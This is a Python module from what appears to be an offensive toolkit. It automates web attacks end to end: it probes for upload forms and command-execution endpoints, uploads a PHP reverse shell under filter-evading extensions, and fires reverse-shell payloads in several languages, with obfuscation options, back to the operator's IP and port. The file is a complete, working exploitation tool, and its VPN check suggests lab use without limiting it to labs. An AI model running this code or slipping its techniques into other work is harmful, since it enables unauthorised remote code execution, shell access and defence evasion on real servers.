"""
Butter Mode - Smooth automated exploitation for file and command-based attacks
"""
import time
import requests
import os
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

from learnshells.utils.logger import Logger
from learnshells.core.interface_detector import InterfaceDetector
from learnshells.generators import get_generator
from learnshells.generators.base import PayloadConfig
from learnshells.evasion.obfuscator import Obfuscator
from learnshells.evasion.wrappers import Wrapper
from learnshells.evasion.encoding import Encoder


class ButterMode:
    """
    Butter Mode - Smooth as butter exploitation.
    
    Handles both file-based and command-based attacks with intelligent
    scanning and variant testing.
    """
    
    def __init__(self, logger: Logger = None):
        """Initialize Butter Mode."""
        self.logger = logger or Logger(educational=False, verbose=False)
        
        # Attack configuration
        self.attack_type = None  # 'file', 'command', or 'auto'
        self.base_url = None
        self.login_url = None
        self.username = None
        self.password = None
        self.session = requests.Session()
        
        # File-based attack config
        self.upload_url = None
        self.execute_path = None
        
        # Command-based attack config
        self.command_url = None
        
        # Network config
        self.vpn_ip = None
        self.selected_port = 4444
        
        # Evasion settings
        self.enable_obfuscation = False
        self.enable_wrapper = False
        self.enable_encoding = False
        
        # Results
        self.success = False
        self.vulnerabilities = []
        
        # Components
        self.interface_detector = InterfaceDetector(self.logger)
        self.obfuscator = Obfuscator(self.logger)
        self.wrapper = Wrapper(self.logger)
        self.encoder = Encoder(self.logger)
    
    def run(self, port: int = None, **kwargs):
        """Run Butter Mode workflow.
        
        Args:
            port: Optional listener port (default: 4444)
            **kwargs: Additional arguments (ignored for compatibility)
        """
        if port:
            self.selected_port = port
        
        self.logger.banner("""
    ____        __  __            __  ___          __    
   / __ )__  __/ /_/ /____  _____/  |/  /___  ____/ /___ 
  / __  / / / / __/ __/ _ \\/ ___/ /|_/ / __ \\/ __  / _ \\
 / /_/ / /_/ / /_/ /_/  __/ /  / /  / / /_/ / /_/ /  __/
/_____/\\__,_/\\__/\\__/\\___/_/  /_/  /_/\\____/\\__,_/\\___/ 
                                                          
        🧈 Smooth as Butter
        """)
        
        try:
            # Step 1: VPN Detection
            if not self._detect_vpn():
                return
            
            # Step 2: Attack Type Selection
            self._select_attack_type()
            
            # Step 3: Gather Information
            self._gather_information()
            
            # Step 4: Evasion Configuration
            self._configure_evasion()
            
            # Step 5: Scan if needed
            if self.attack_type == 'auto' or self._needs_scanning():
                self._scan_target()
            
            # Step 6: Execute Attack
            if self.attack_type == 'file' or 'file_upload' in [v['type'] for v in self.vulnerabilities]:
                self._execute_file_attack()
            
            if self.attack_type == 'command' or 'command_execution' in [v['type'] for v in self.vulnerabilities]:
                self._execute_command_attack()
            
            # Step 7: Summary
            self._display_summary()
            
        except KeyboardInterrupt:
            self.logger.warning("\nButter Mode interrupted by user")
        except Exception as e:
            self.logger.error(f"Butter Mode failed: {e}")
            import traceback
            traceback.print_exc()
    
    def _detect_vpn(self) -> bool:
        """Detect VPN connection."""
        self.logger.loading("Detecting VPN interface")
        
        vpn_interface = self.interface_detector.detect_vpn_interface()
        
        if not vpn_interface:
            self.logger.error("No VPN detected - cannot continue")
            return False
        
        self.vpn_ip = self.interface_detector.vpn_ip
        self.logger.success(f"VPN: {vpn_interface} ({self.vpn_ip})")
        
        return True
    
    def _select_attack_type(self):
        """Let user select attack type."""
        self.logger.separator()
        self.logger.header("🎯 Attack Type Selection")
        
        print("\n1. File-based (upload shell)")
        print("2. Command-based (RCE/injection)")
        print("3. I don't know (scan and detect)")
        
        choice = input("\nChoice [1-3]: ").strip()
        
        if choice == '1':
            self.attack_type = 'file'
            self.logger.info("Selected: File-based attack")
        elif choice == '2':
            self.attack_type = 'command'
            self.logger.info("Selected: Command-based attack")
        else:
            self.attack_type = 'auto'
            self.logger.info("Selected: Auto-detect vulnerabilities")
    
    def _gather_information(self):
        """Gather information based on attack type."""
        self.logger.separator()
        self.logger.header("📋 Information Gathering")
        
        if self.attack_type == 'file':
            self._gather_file_info()
        elif self.attack_type == 'command':
            self._gather_command_info()
        else:
            self._gather_auto_info()
    
    def _gather_file_info(self):
        """Gather information for file-based attack."""
        print("\nDo you have all file upload info? [y/n]: ", end='')
        has_all = input().strip().lower() in ['y', 'yes']
        
        if has_all:
            self.login_url = input("Login page URL (Enter to skip): ").strip() or None
            if self.login_url:
                self.username = input("Username: ").strip()
                self.password = input("Password: ").strip()
            
            self.upload_url = input("Upload endpoint URL: ").strip()
            self.execute_path = input("Execution path URL: ").strip()
            self.base_url = self._extract_base_url(self.upload_url)
        else:
            self.base_url = input("Base URL: ").strip()
            self.login_url = input("Login page (optional, Enter to skip): ").strip() or None
            if self.login_url:
                self.username = input("Username: ").strip()
                self.password = input("Password: ").strip()
            
            self.upload_url = input("Upload endpoint (optional, Enter to skip): ").strip() or None
            self.execute_path = input("Execution path (optional, Enter to skip): ").strip() or None
    
    def _gather_command_info(self):
        """Gather information for command-based attack."""
        print("\nDo you have command execution endpoint? [y/n]: ", end='')
        has_endpoint = input().strip().lower() in ['y', 'yes']
        
        if has_endpoint:
            self.command_url = input("Command execution URL: ").strip()
            self.login_url = input("Login page URL (Enter to skip): ").strip() or None
            if self.login_url:
                self.username = input("Username: ").strip()
                self.password = input("Password: ").strip()
            self.base_url = self._extract_base_url(self.command_url)
        else:
            self.base_url = input("Base URL: ").strip()
            self.login_url = input("Login page (optional, Enter to skip): ").strip() or None
            if self.login_url:
                self.username = input("Username: ").strip()
                self.password = input("Password: ").strip()
            
            self.command_url = input("Command endpoint (optional, Enter to skip): ").strip() or None
    
    def _gather_auto_info(self):
        """Gather information for auto-detect mode."""
        self.base_url = input("\nBase URL: ").strip()
        self.login_url = input("Login page (optional, Enter to skip): ").strip() or None
        if self.login_url:
            self.username = input("Username: ").strip()
            self.password = input("Password: ").strip()
    
    def _configure_evasion(self):
        """Configure evasion options."""
        self.logger.separator()
        self.logger.header("🎭 Evasion Configuration")
        
        print("\nEnable obfuscation? [y/n]: ", end='')
        self.enable_obfuscation = input().strip().lower() in ['y', 'yes']
        
        print("Enable wrappers? [y/n]: ", end='')
        self.enable_wrapper = input().strip().lower() in ['y', 'yes']
        
        print("Enable encoding? [y/n]: ", end='')
        self.enable_encoding = input().strip().lower() in ['y', 'yes']
        
        if self.enable_obfuscation:
            self.logger.success("✓ Obfuscation enabled")
        if self.enable_wrapper:
            self.logger.success("✓ Wrappers enabled")
        if self.enable_encoding:
            self.logger.success("✓ Encoding enabled")
    
    def _needs_scanning(self) -> bool:
        """Check if scanning is needed."""
        if self.attack_type == 'file':
            return not (self.upload_url and self.execute_path)
        elif self.attack_type == 'command':
            return not self.command_url
        return True
    
    def _scan_target(self):
        """Scan target for vulnerabilities."""
        self.logger.separator()
        self.logger.loading("Scanning target for vulnerabilities")
        
        # Login if credentials provided
        if self.login_url and self.username and self.password:
            self._perform_login()
        
        # Scan for file upload
        if self.attack_type in ['file', 'auto']:
            self._scan_for_file_upload()
        
        # Scan for command execution
        if self.attack_type in ['command', 'auto']:
            self._scan_for_command_execution()
        
        # Display findings
        self._display_scan_results()
    
    def _perform_login(self) -> bool:
        """Perform login to target."""
        self.logger.loading(f"Logging in as {self.username}")
        
        try:
            # Try to detect login form
            response = self.session.get(self.login_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            form = soup.find('form')
            if not form:
                self.logger.warning("Could not find login form")
                return False
            
            # Extract form action
            action = form.get('action', '')
            if action:
                login_post_url = urljoin(self.login_url, action)
            else:
                login_post_url = self.login_url
            
            # Find input fields
            inputs = form.find_all('input')
            form_data = {}
            
            for inp in inputs:
                name = inp.get('name')
                input_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')
                
                if name:
                    if input_type == 'password':
                        form_data[name] = self.password
                    elif input_type in ['text', 'email'] and not value:
                        form_data[name] = self.username
                    else:
                        form_data[name] = value
            
            # Attempt login
            login_response = self.session.post(login_post_url, data=form_data, timeout=10)
            
            # Check if login successful (basic check)
            if login_response.status_code == 200 and 'logout' in login_response.text.lower():
                self.logger.success("✓ Login successful")
                return True
            else:
                self.logger.warning("Login may have failed (check manually)")
                return False
                
        except Exception as e:
            self.logger.error(f"Login error: {e}")
            return False
    
    def _scan_for_file_upload(self):
        """Scan for file upload capabilities."""
        self.logger.info("Scanning for file upload forms...")
        
        # Extended upload paths wordlist
        upload_paths = [
            # Upload endpoints
            '/upload', '/upload.php', '/admin/upload', '/upload/index.php',
            '/file/upload', '/files/upload', '/uploader', '/upload.asp',
            '/upload.aspx', '/fileupload', '/media/upload', '/upload/file',
            '/upload.html', '/fileUpload', '/file_upload',
            '/admin/fileupload', '/admin/file-upload', '/upload-file',
            '/panel/upload', '/dashboard/upload', '/user/upload',
            '/content/upload', '/wp-admin/upload.php',
            '/administrator/upload', '/manage/upload', '/console/upload',
            '/uploader.php', '/uploader.asp', '/uploader.aspx',
            '/file-manager', '/filemanager', '/fm', '/file_manager.php',
            '/tinymce/upload', '/ckeditor/upload', '/editor/upload',
            # Admin/control panel paths
            '/panel', '/panel/', '/panel/index.php', '/panel/index.html',
            '/admin', '/admin/', '/admin/index.php', '/administrator',
            '/dashboard', '/dashboard/', '/manage', '/manage/',
            '/control', '/control/', '/cpanel', '/cpanel/',
            '/backend', '/backend/', '/console', '/console/'
        ]
        
        # Execution paths (where files end up)
        execution_paths = [
            '/uploads', '/uploads/', '/upload/', '/uploaded',
            '/uploaded_files', '/uploadedfiles', '/uploadedFiles',
            '/files', '/files/', '/Files', '/file', '/file/',
            '/media', '/media/', '/assets', '/assets/',
            '/images', '/images/', '/img', '/img/', '/pics',
            '/documents', '/docs', '/attachments', '/data',
            '/content', '/content/', '/resources', '/static',
            '/public', '/public/uploads', '/storage', '/storage/uploads',
            '/user_uploads', '/temp', '/tmp', '/cache'
        ]
        
        found_uploads = []
        found_execution_paths = []
        
        # 1. Check common paths
        self.logger.info("→ Checking common upload paths...")
        for path in upload_paths:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, timeout=5, allow_redirects=True)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    file_inputs = soup.find_all('input', {'type': 'file'})
                    
                    if file_inputs:
                        found_uploads.append(url)
                        self.logger.success(f"  ✓ Found upload form: {path}")
                        if not self.upload_url:
                            self.upload_url = url
            except:
                continue
        
        # 2. Check execution paths (where files go)
        if found_uploads:
            self.logger.info("→ Checking execution paths...")
            for path in execution_paths:
                try:
                    url = urljoin(self.base_url, path)
                    response = self.session.get(url, timeout=5)
                    
                    # Check if path exists and is accessible
                    if response.status_code == 200:
                        found_execution_paths.append(url)
                        self.logger.success(f"  ✓ Found execution path: {path}")
                        if not self.execute_path:
                            self.execute_path = url
                except:
                    continue
        
        # 3. Spider main page for file upload forms
        if not found_uploads:
            self.logger.info("→ Spidering main page for file inputs...")
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                links = soup.find_all('a', href=True)
                for link in links[:50]:  # Limit to first 50 links
                    href = link['href']
                    full_url = urljoin(self.base_url, href)
                    
                    # Only check same-domain links
                    if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                        try:
                            link_response = self.session.get(full_url, timeout=5)
                            if link_response.status_code == 200:
                                link_soup = BeautifulSoup(link_response.text, 'html.parser')
                                file_inputs = link_soup.find_all('input', {'type': 'file'})
                                
                                if file_inputs:
                                    found_uploads.append(full_url)
                                    self.logger.success(f"  ✓ Found via spider: {href}")
                                    if not self.upload_url:
                                        self.upload_url = full_url
                        except:
                            continue
            except Exception as e:
                self.logger.warning(f"Spider error: {e}")
        
        # 4. Check for file inputs on main page
        if not found_uploads:
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                file_inputs = soup.find_all('input', {'type': 'file'})
                
                if file_inputs:
                    found_uploads.append(self.base_url)
                    self.logger.success(f"  ✓ Found on main page")
                    if not self.upload_url:
                        self.upload_url = self.base_url
            except:
                pass
        
        if found_uploads:
            self.vulnerabilities.append({
                'type': 'file_upload',
                'urls': found_uploads,
                'execution_paths': found_execution_paths
            })
            self.logger.success(f"✓ Found {len(found_uploads)} upload form(s)")
            if found_execution_paths:
                self.logger.success(f"✓ Found {len(found_execution_paths)} execution path(s)")
        else:
            self.logger.warning("No file upload forms found")
            self.logger.info("💡 Recommendations:")
            self.logger.info("   • gobuster dir -u {} -w /usr/share/wordlists/dirb/common.txt".format(self.base_url))
            self.logger.info("   • dirsearch -u {} -e php,asp,aspx,jsp".format(self.base_url))
            self.logger.info("   • Check robots.txt and sitemap.xml manually")
    
    def _scan_for_command_execution(self):
        """Scan for command execution points."""
        self.logger.info("Scanning for command execution points...")
        
        # Extended RCE paths
        rce_paths = [
            '/cmd', '/exec', '/execute', '/run', '/api/exec',
            '/admin/cmd', '/console', '/terminal', '/shell',
            '/rce', '/ping', '/system', '/command', '/cmd.php',
            '/exec.php', '/execute.php', '/shell.php', '/terminal.php',
            '/admin/exec', '/admin/command', '/admin/shell',
            '/api/command', '/api/run', '/api/shell', '/api/exec.php',
            '/debug/exec', '/test/exec', '/dev/exec',
            '/ping.php', '/system.php', '/console.php'
        ]
        
        found_rce = []
        
        # 1. Check common RCE paths
        self.logger.info("→ Checking common command execution paths...")
        for path in rce_paths:
            try:
                url = urljoin(self.base_url, path)
                # Test with multiple harmless commands
                test_commands = [
                    ('cmd', 'echo test123'),
                    ('command', 'echo test123'),
                    ('exec', 'echo test123'),
                    ('execute', 'echo test123'),
                    ('input', 'echo test123'),
                    ('c', 'echo test123')
                ]
                
                for param, value in test_commands:
                    try:
                        response = self.session.get(url, params={param: value}, timeout=5)
                        if response.status_code == 200 and 'test123' in response.text:
                            found_rce.append({'url': url, 'param': param})
                            self.logger.success(f"  ✓ Found RCE: {path} (param: {param})")
                            if not self.command_url:
                                self.command_url = url
                            break
                    except:
                        continue
            except:
                continue
        
        # 2. Spider for forms with suspicious inputs
        if not found_rce:
            self.logger.info("→ Spidering for command execution forms...")
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for suspicious form fields
                suspicious_names = [
                    'cmd', 'command', 'exec', 'execute', 'run',
                    'shell', 'terminal', 'console', 'system', 'ping'
                ]
                
                forms = soup.find_all('form')
                for form in forms:
                    inputs = form.find_all('input')
                    for inp in inputs:
                        name = inp.get('name', '').lower()
                        if any(sus in name for sus in suspicious_names):
                            action = form.get('action', self.base_url)
                            full_url = urljoin(self.base_url, action)
                            found_rce.append({'url': full_url, 'param': inp.get('name')})
                            self.logger.success(f"  ✓ Suspicious form field found: {name}")
                            if not self.command_url:
                                self.command_url = full_url
            except Exception as e:
                self.logger.warning(f"Spider error: {e}")
        
        # 3. Check main page for command execution
        if not found_rce:
            try:
                # Test main page with common parameters
                test_params = ['cmd', 'command', 'exec']
                for param in test_params:
                    response = self.session.get(
                        self.base_url,
                        params={param: 'echo test123'},
                        timeout=5
                    )
                    if 'test123' in response.text:
                        found_rce.append({'url': self.base_url, 'param': param})
                        self.logger.success(f"  ✓ Found on main page (param: {param})")
                        if not self.command_url:
                            self.command_url = self.base_url
                        break
            except:
                pass
        
        if found_rce:
            self.vulnerabilities.append({
                'type': 'command_execution',
                'endpoints': found_rce
            })
            self.logger.success(f"✓ Found {len(found_rce)} command execution point(s)")
        else:
            self.logger.warning("No command execution points found")
            self.logger.info("💡 Manual testing required:")
            self.logger.info("   • Test URL parameters manually")
            self.logger.info("   • Check for eval(), exec(), system() functions")
            self.logger.info("   • Look for template injection vulnerabilities")
    
    def _display_scan_results(self):
        """Display scan results and let user choose attack."""
        if not self.vulnerabilities:
            self.logger.warning("\n⚠ No vulnerabilities detected automatically")
            if input("Continue with manual exploitation? [y/n]: ").strip().lower() not in ['y', 'yes']:
                return
        else:
            self.logger.separator()
            self.logger.header("📊 Scan Results")
            
            has_file = any(v['type'] == 'file_upload' for v in self.vulnerabilities)
            has_command = any(v['type'] == 'command_execution' for v in self.vulnerabilities)
            
            if has_file:
                self.logger.success("✓ File upload capability detected")
            if has_command:
                self.logger.success("✓ Command execution capability detected")
            
            # If auto mode and multiple vulns found, ask what to attack
            if self.attack_type == 'auto' and len(self.vulnerabilities) > 1:
                print("\n🎯 What would you like to attack?")
                print("1. File upload")
                print("2. Command execution")
                print("3. Both (try file first)")
                
                choice = input("\nChoice [1-3]: ").strip()
                if choice == '1':
                    self.attack_type = 'file'
                elif choice == '2':
                    self.attack_type = 'command'
                # else try both
    
    def _execute_file_attack(self):
        """Execute file-based attack."""
        self.logger.separator()
        self.logger.header("📁 File-Based Attack")
        
        if not self.upload_url:
            self.logger.error("No upload endpoint available")
            return
        
        # Load shell from generators
        shell_content = self._load_shell_file()
        if not shell_content:
            return
        
        # Customize shell
        shell_content = self._customize_shell(shell_content)
        
        # Get filename variants
        variants = self._get_filename_variants()
        
        # Try each variant
        for filename in variants:
            self.logger.info(f"\n📤 Trying: {filename}")
            
            if self._upload_file(shell_content, filename):
                # Try to execute
                if self._execute_uploaded_shell(filename):
                    # Check if shell worked
                    print("\n💡 Did you get a shell? [ENTER=yes, SPACE=no]: ", end='', flush=True)
                    response = self._wait_for_key()
                    
                    if response == 'enter':
                        self.logger.success("🎉 Shell confirmed!")
                        self.success = True
                        return
                    else:
                        self.logger.warning("No shell, trying next variant...")
        
        self.logger.warning("⚠ All file variants failed")
    
    def _execute_command_attack(self):
        """Execute command-based attack."""
        self.logger.separator()
        self.logger.header("⚡ Command-Based Attack")
        
        if not self.command_url:
            self.logger.error("No command execution endpoint available")
            return
        
        # Generate base payload
        config = PayloadConfig(lhost=self.vpn_ip, lport=self.selected_port)
        
        # Try different payload types
        payload_types = ['bash', 'python', 'php', 'perl', 'ruby', 'nodejs']
        
        for payload_type in payload_types:
            self.logger.info(f"\n📦 Trying {payload_type} payload...")
            
            try:
                generator = get_generator(payload_type)(config)
                base_payload = generator.generate()
                
                # Get variants with evasion
                variants = self._get_command_variants(base_payload, payload_type)
                
                # Try each variant
                for variant_name, variant_payload in variants:
                    self.logger.info(f"  → {variant_name}")
                    
                    if self._send_command_payload(variant_payload):
                        time.sleep(2)
                        print("\n💡 Did you get a shell? [ENTER=yes, SPACE=no]: ", end='', flush=True)
                        response = self._wait_for_key()
                        
                        if response == 'enter':
                            self.logger.success("🎉 Shell confirmed!")
                            self.success = True
                            return
                        else:
                            self.logger.warning("No shell, trying next variant...")
            except Exception as e:
                self.logger.error(f"Error with {payload_type}: {e}")
                continue
        
        self.logger.warning("⚠ All command payloads failed")
    
    def _load_shell_file(self) -> Optional[str]:
        """Load shell file from generators."""
        shell_path = os.path.join(
            os.path.dirname(__file__),
            '..',
            'generators',
            'monkeyphp.php'
        )
        
        try:
            with open(shell_path, 'r') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Shell file not found: {shell_path}")
            return None
    
    def _customize_shell(self, shell_content: str) -> str:
        """Customize shell with IP and port."""
        customized = shell_content.replace('ip_here', self.vpn_ip)
        customized = customized.replace('port_here', str(self.selected_port))
        # Also support legacy placeholders
        customized = customized.replace('$IP', self.vpn_ip)
        customized = customized.replace('$PORT', str(self.selected_port))
        customized = customized.replace('LHOST', self.vpn_ip)
        customized = customized.replace('LPORT', str(self.selected_port))
        return customized
    
    def _get_filename_variants(self) -> List[str]:
        """Get filename variants for obfuscation."""
        extensions = [
            'php', 'php5', 'phtml', 'phar', 'inc',
            'php3', 'php4', 'phps', 'pht', 'phpt'
        ]
        
        print("\n📦 Filename obfuscation options:")
        for i, ext in enumerate(extensions, 1):
            print(f"{i}. monkeyphp.{ext}")
        print(f"{len(extensions) + 1}. All (try each one)")
        
        selection = input("\nSelect extensions (comma-separated, e.g., 1,3,11): ").strip()
        
        selected_variants = []
        
        if not selection:
            selected_variants = ['monkeyphp.php']
        else:
            indices = [s.strip() for s in selection.split(',')]
            for idx in indices:
                if idx.isdigit():
                    num = int(idx)
                    if num == len(extensions) + 1:  # All
                        selected_variants = [f"monkeyphp.{ext}" for ext in extensions]
                        break
                    elif 1 <= num <= len(extensions):
                        selected_variants.append(f"monkeyphp.{extensions[num-1]}")
        
        return selected_variants if selected_variants else ['monkeyphp.php']
    
    def _get_command_variants(self, base_payload: str, payload_type: str) -> List[Tuple[str, str]]:
        """Get command payload variants with evasion."""
        variants = [("Original", base_payload)]
        
        # Apply wrappers if enabled
        if self.enable_wrapper:
            if payload_type in ['bash', 'sh']:
                wrapped = self.wrapper.wrap_bash(base_payload)
                variants.extend(wrapped)
            elif payload_type in ['python', 'python3']:
                wrapped = self.wrapper.wrap_python(base_payload)
                variants.extend(wrapped)
            elif payload_type == 'php':
                wrapped = self.wrapper.wrap_php(base_payload)
                variants.extend(wrapped)
        
        # Apply obfuscation if enabled
        if self.enable_obfuscation:
            if payload_type in ['bash', 'sh']:
                obfuscated = self.obfuscator.obfuscate_bash(base_payload, self.vpn_ip, self.selected_port)
                variants.extend(obfuscated)
            elif payload_type in ['python', 'python3']:
                obfuscated = self.obfuscator.obfuscate_python(base_payload, self.vpn_ip, self.selected_port)
                variants.extend(obfuscated)
        
        return variants
    
    def _upload_file(self, content: str, filename: str) -> bool:
        """Upload file to target - smart form handling."""
        try:
            self.logger.loading(f"Uploading {filename}")
            
            # CRITICAL: Get the upload page first to receive session cookie
            try:
                self.logger.info("Getting upload page to establish session...")
                initial_response = self.session.get(self.upload_url, timeout=10)
                self.logger.info(f"Session cookies: {self.session.cookies.get_dict()}")
                
                soup = BeautifulSoup(initial_response.text, 'html.parser')
                
                # Find the form
                form = soup.find('form')
                if not form:
                    self.logger.error("No form found on upload page")
                    return False
                
                # Get form action
                action = form.get('action', '')
                if action:
                    upload_post_url = urljoin(self.upload_url, action)
                else:
                    # If no action, POST to the same URL (ensure trailing slash like browser)
                    upload_post_url = self.upload_url
                    if not upload_post_url.endswith('/'):
                        upload_post_url += '/'
                
                # Get form method
                method = form.get('method', 'post').lower()
                
                # Find file input field
                file_input = form.find('input', {'type': 'file'})
                file_field_name = file_input.get('name', 'file') if file_input else 'file'
                
                # Collect all other form fields
                form_data = {}
                for inp in form.find_all('input'):
                    inp_name = inp.get('name')
                    inp_type = inp.get('type', 'text').lower()
                    inp_value = inp.get('value', '')
                    
                    if inp_name and inp_type not in ['file']:
                        # Include submit buttons
                        if inp_type == 'submit':
                            form_data[inp_name] = inp_value if inp_value else 'Upload'
                        else:
                            form_data[inp_name] = inp_value
                
                # Check for textarea, select, etc.
                for textarea in form.find_all('textarea'):
                    name = textarea.get('name')
                    if name:
                        form_data[name] = textarea.text
                
                for select in form.find_all('select'):
                    name = select.get('name')
                    if name:
                        option = select.find('option')
                        if option:
                            form_data[name] = option.get('value', '')
                
                self.logger.info(f"Form action: {upload_post_url}")
                self.logger.info(f"File field name: {file_field_name}")
                self.logger.info(f"Additional form data: {list(form_data.keys())}")
                
            except Exception as e:
                self.logger.warning(f"Could not parse form: {e}")
                file_field_name = 'file'
                upload_post_url = self.upload_url
                form_data = {'submit': 'Upload'}
            
            # Prepare file upload with correct MIME type
            files = {file_field_name: (filename, content, 'application/x-php')}
            
            # Perform upload
            self.logger.loading("Sending upload request...")
            
            # Debug: show what we're sending
            self.logger.info(f"Uploading to: {upload_post_url}")
            self.logger.info(f"File: {filename} ({len(content)} bytes)")
            self.logger.info(f"Form data: {form_data}")
            
            upload_response = self.session.post(
                upload_post_url,
                files=files,
                data=form_data,
                timeout=15,
                allow_redirects=True
            )
            
            self.logger.info(f"Upload response: HTTP {upload_response.status_code}")
            
            # Show MORE of the response for debugging
            response_preview = upload_response.text[:1500]
            self.logger.info(f"Response length: {len(upload_response.text)} bytes")
            
            # Look for specific messages in response
            if 'successfully' in upload_response.text.lower():
                self.logger.info("Found 'successfully' in response")
            if 'uploaded' in upload_response.text.lower():
                self.logger.info("Found 'uploaded' in response")
            if 'error' in upload_response.text.lower():
                self.logger.warning("Found 'error' in response")
            
            # Check for success indicators
            success_indicators = [
                'success', 'uploaded', 'complete', 'done', 'file has been',
                filename.lower(), 'successfully', 'saved', 'received'
            ]
            
            error_indicators = [
                'error', 'failed', 'invalid', 'not allowed', 'forbidden',
                'denied', 'rejected', 'extension', 'type not allowed'
            ]
            
            response_lower = upload_response.text.lower()
            
            # Check for errors first
            if any(error in response_lower for error in error_indicators):
                self.logger.error("Upload rejected by server")
                self.logger.error(f"Response: {upload_response.text[:300]}")
                return False
            
            # Check for success
            if upload_response.status_code in [200, 201, 302]:
                if any(indicator in response_lower for indicator in success_indicators):
                    self.logger.success(f"✓ Upload appears successful")
                    
                    # Try to verify file exists
                    if self.execute_path:
                        verify_url = urljoin(self.execute_path, filename)
                        try:
                            verify_response = self.session.get(verify_url, timeout=5)
                            if verify_response.status_code == 200:
                                self.logger.success(f"✓ Verified: File accessible at {verify_url}")
                                return True
                            else:
                                self.logger.warning(f"File not found at {verify_url} (HTTP {verify_response.status_code})")
                        except:
                            pass
                    
                    return True
                else:
                    self.logger.warning("Upload returned success code but no confirmation message")
                    
                    # FIRST: Try to verify file exists before asking user
                    if self.execute_path:
                        # Ensure execute_path ends with /
                        exec_path = self.execute_path
                        if not exec_path.endswith('/'):
                            exec_path += '/'
                        
                        verify_url = urljoin(exec_path, filename)
                        self.logger.info(f"Checking if file exists at: {verify_url}")
                        try:
                            verify_response = self.session.get(verify_url, timeout=5)
                            if verify_response.status_code == 200:
                                # Check if it's actually the PHP file (not 404 page)
                                if 'php' in verify_response.headers.get('content-type', '').lower() or len(verify_response.text) > 100:
                                    self.logger.success(f"✓ File verified at {verify_url}")
                                    return True
                                else:
                                    self.logger.warning(f"File at {verify_url} doesn't appear to be PHP code")
                            else:
                                self.logger.warning(f"File not found at {verify_url} (HTTP {verify_response.status_code})")
                        except Exception as e:
                            self.logger.warning(f"Could not verify file: {e}")
                    
                    # Ask user as fallback
                    print(f"\nFull response:\n{upload_response.text[:800]}\n")
                    if input("Does the upload appear successful? Check /uploads/ manually if needed. [y/n]: ").strip().lower() in ['y', 'yes']:
                        return True
                    return False
            else:
                self.logger.error(f"Upload failed: HTTP {upload_response.status_code}")
                self.logger.error(f"Response: {upload_response.text[:500]}")
                return False
                
        except Exception as e:
            self.logger.error(f"Upload error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _execute_uploaded_shell(self, filename: str) -> bool:
        """Execute uploaded shell."""
        if not self.execute_path:
            self.logger.warning("No execution path provided, skipping execution")
            return False
        
        # Ensure execute_path ends with / for proper URL joining
        exec_path = self.execute_path
        if not exec_path.endswith('/'):
            exec_path += '/'
        
        shell_url = urljoin(exec_path, filename)
        
        self.logger.info(f"📍 Shell URL: {shell_url}")
        self.logger.info(f"🎧 Start listener: nc -lvnp {self.selected_port}")
        input("\n⏳ Press Enter when listener is ready...")
        
        self.logger.loading("Triggering shell")
        
        try:
            requests.get(shell_url, timeout=3)
        except requests.exceptions.Timeout:
            pass  # Timeout expected if shell connects
        except Exception as e:
            self.logger.warning(f"Trigger error (may be normal): {e}")
        
        time.sleep(2)
        return True
    
    def _send_command_payload(self, payload: str) -> bool:
        """Send command payload to target."""
        try:
            # Try common parameter names
            params_to_try = ['cmd', 'command', 'exec', 'execute', 'run']
            
            for param in params_to_try:
                try:
                    if '?' in self.command_url:
                        url = f"{self.command_url}&{param}={requests.utils.quote(payload)}"
                    else:
                        url = f"{self.command_url}?{param}={requests.utils.quote(payload)}"
                    
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200:
                        return True
                except:
                    continue
            
            return False
        except Exception as e:
            return False
    
    def _wait_for_key(self) -> str:
        """Wait for ENTER or SPACE key."""
        import sys
        import tty
        import termios
        
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        
        try:
            tty.setraw(fd)
            char = sys.stdin.read(1)
            
            if char == '\r' or char == '\n':
                return 'enter'
            elif char == ' ':
                return 'space'
            else:
                return 'other'
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            print()  # New line after key press
    
    def _extract_base_url(self, url: str) -> str:
        """Extract base URL from full URL."""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def _display_summary(self):
        """Display execution summary."""
        self.logger.separator()
        self.logger.header("📊 Summary")
        
        if self.success:
            self.logger.success("\n🎉 Exploitation successful!")
            self.logger.info("Next steps:")
            self.logger.list_item("1. Stabilize shell (python3 -c 'import pty;pty.spawn(\"/bin/bash\")')")
            self.logger.list_item("2. Upgrade TTY")
            self.logger.list_item("3. Enumerate system")
        else:
            self.logger.warning("\n⚠ Exploitation unsuccessful")
            self.logger.info("Troubleshooting:")
            self.logger.list_item("• Verify vulnerability exists")
            self.logger.list_item("• Check firewall/filtering")
            self.logger.list_item("• Try different ports")
            self.logger.list_item("• Manual exploitation may be needed")
